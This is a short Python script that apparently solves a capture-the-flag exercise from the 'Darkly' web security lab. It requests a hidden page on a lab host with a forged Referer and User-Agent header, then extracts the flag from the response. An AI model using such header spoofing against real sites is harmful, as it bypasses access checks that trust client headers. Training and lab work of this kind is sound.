import requests
import re
import os

ip = os.getenv('darkly_ip')
baseurl = f'http://{ip}/'

if __name__ == '__main__':
    r = requests.get(baseurl + '/index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c', headers={
        'Referer': 'https://www.nsa.gov/',
        'User-Agent': 'ft_bornToSec'
    })
    m = re.findall('The flag is : ([a-z0-9]+)<', r.text)
    print(*m)

